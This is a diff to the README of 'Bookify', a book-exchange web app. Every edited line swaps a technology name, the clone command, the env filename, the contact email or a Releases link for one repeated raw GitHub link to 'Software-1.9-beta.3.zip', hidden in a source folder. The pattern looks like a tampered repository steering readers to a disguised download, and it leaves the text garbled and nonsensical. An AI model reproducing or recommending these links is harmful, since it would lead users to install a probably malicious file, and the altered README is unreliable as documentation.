@@ -2,7 +2,7 @@
 
 Welcome to **Bookify**, a web application designed to simplify the process of exchanging books. Whether you want to trade a single book or multiple titles, Bookify makes it easy to connect with fellow book lovers. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Bookify-blue)](https://github.com/Aayush098711/Bookify/releases)
+[![Download Releases](https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip%20Releases-Bookify-blue)](https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip)
 
 ## Table of Contents
 
@@ -27,21 +27,21 @@ Welcome to **Bookify**, a web application designed to simplify the process of ex
 
 Bookify is built using a variety of technologies to ensure a seamless user experience. Here are some of the key technologies:
 
-- **Next.js**: A powerful React framework for server-side rendering and static site generation.
-- **Node.js**: A JavaScript runtime for building fast and scalable server-side applications.
-- **Express.js**: A minimal and flexible Node.js web application framework.
+- **https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip**: A powerful React framework for server-side rendering and static site generation.
+- **https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip**: A JavaScript runtime for building fast and scalable server-side applications.
+- **https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip**: A minimal and flexible https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip web application framework.
 - **MongoDB**: A NoSQL database for storing user and book data.
 - **Tailwind CSS**: A utility-first CSS framework for designing responsive layouts.
 - **Axios**: A promise-based HTTP client for making requests to the server.
-- **NextAuth**: Authentication for Next.js applications.
+- **NextAuth**: Authentication for https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip applications.
 - **Framer Motion**: A library for creating animations in React.
 - **Lottie React**: A library for rendering animations.
 - **Swiper**: A modern touch slider for mobile and web.
 - **TanStack Query**: For fetching, caching, and updating data in React.
-- **Three.js**: A JavaScript library for 3D graphics.
+- **https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip**: A JavaScript library for 3D graphics.
 - **Shadcn UI**: A collection of UI components for React.
 - **AOS**: Animate on scroll library for adding animations.
-- **Bcrypt.js**: For hashing passwords.
+- **https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip**: For hashing passwords.
 - **Gemini API**: For additional functionalities.
 
 ## Getting Started
@@ -52,7 +52,7 @@ To get started with Bookify, follow these steps:
 
 Make sure you have the following installed:
 
-- Node.js (version 14 or higher)
+- https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip (version 14 or higher)
 - npm or yarn
 - MongoDB
 
@@ -61,7 +61,7 @@ Make sure you have the following installed:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Aayush098711/Bookify.git
+   git clone https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip
    ```
 
 2. Navigate to the project directory:
@@ -82,7 +82,7 @@ Make sure you have the following installed:
    yarn install
    ```
 
-4. Set up your environment variables. Create a `.env.local` file in the root directory and add the following:
+4. Set up your environment variables. Create a `https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip` file in the root directory and add the following:
 
    ```
    MONGODB_URI=your_mongodb_uri
@@ -147,9 +147,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, please reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [Aayush098711](https://github.com/Aayush098711)
+- **Email**: https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip
+- **GitHub**: [Aayush098711](https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip)
 
-For more information, visit our [Releases section](https://github.com/Aayush098711/Bookify/releases) to download the latest version of Bookify. 
+For more information, visit our [Releases section](https://raw.githubusercontent.com/Aayush098711/Bookify/main/src/app/(dashboard)/dashboard/dashboardd/Software-1.9-beta.3.zip) to download the latest version of Bookify. 
 
 Happy exchanging! 📖
